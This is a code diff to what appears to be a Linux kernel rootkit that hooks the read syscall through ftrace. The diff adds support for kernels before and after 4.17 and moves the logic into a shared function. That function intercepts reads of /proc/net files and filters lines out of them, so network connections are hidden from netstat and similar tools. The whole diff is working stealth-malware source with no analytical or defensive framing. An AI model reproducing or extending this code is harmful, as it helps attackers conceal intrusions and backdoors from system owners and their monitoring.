@@ -4,14 +4,30 @@
 #include "utils/ftrace_utils.h"
 #include "hooks/x64_sys_read.h"
 
-asmlinkage long (*orig_read)(const struct pt_regs *regs);
+#if LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0)
+asmlinkage long (*orig_read)(unsigned int fd, char __user *buf, size_t count);
 
+asmlinkage long hook_read(unsigned int fd, char __user *buf, size_t count)
+{
+    long ret = orig_read(fd, buf, count);
+    return hook_read_impl(fd, buf, ret);
+}
+#else
+asmlinkage long (*orig_read)(const struct pt_regs *regs);
 
 asmlinkage int hook_read(const struct pt_regs *regs)
 {
     unsigned int fd = regs->di;
     char __user *buf = (char __user *)regs->si;
-    ssize_t ret;
+    long ret = orig_read(regs);
+    return hook_read_impl(fd, buf, ret);
+}
+#endif
+
+
+long hook_read_impl(unsigned int fd, char __user *buf, long ret)
+{
+    ssize_t ret2 = ret;
     struct file *f = fget(fd);
 
     if (f && f->f_path.dentry) {
@@ -20,27 +36,26 @@ asmlinkage int hook_read(const struct pt_regs *regs)
             f->f_path.dentry->d_parent &&
             strcmp(f->f_path.dentry->d_parent->d_name.name, "net") == 0) {
 
-            ret = orig_read(regs);
-            if (ret <= 0) {
+            if (ret2 <= 0) {
                 fput(f);
-                return ret;
+                return ret2;
             }
 
             {
-                char *kbuf = kmalloc(ret + 1, GFP_KERNEL);
+                char *kbuf = kmalloc(ret2 + 1, GFP_KERNEL);
                 char *filtered;
                 size_t new_len;
 
                 if (!kbuf) {
                     fput(f);
-                    return ret;
+                    return ret2;
                 }
-                if (copy_from_user(kbuf, buf, ret)) {
+                if (copy_from_user(kbuf, buf, ret2)) {
                     kfree(kbuf);
                     fput(f);
-                    return ret;
+                    return ret2;
                 }
-                kbuf[ret] = '\0';
+                kbuf[ret2] = '\0';
 
                 filtered = filter_netstat_lines(kbuf, &new_len);
                 kfree(kbuf);
@@ -49,19 +64,17 @@ asmlinkage int hook_read(const struct pt_regs *regs)
                     if (copy_to_user(buf, filtered, new_len)) {
                         kfree(filtered);
                         fput(f);
-                        return ret; // fall back to unfiltered data on failure
+                        return ret2; // fall back to unfiltered data on failure
                     }
-                    ret = new_len;
+                    ret2 = new_len;
                     kfree(filtered);
                 }
             }
             fput(f);
-            return ret;
+            return ret2;
         }
     }
     if (f)
         fput(f);
-    ret = orig_read(regs);
     return ret;
 }
-
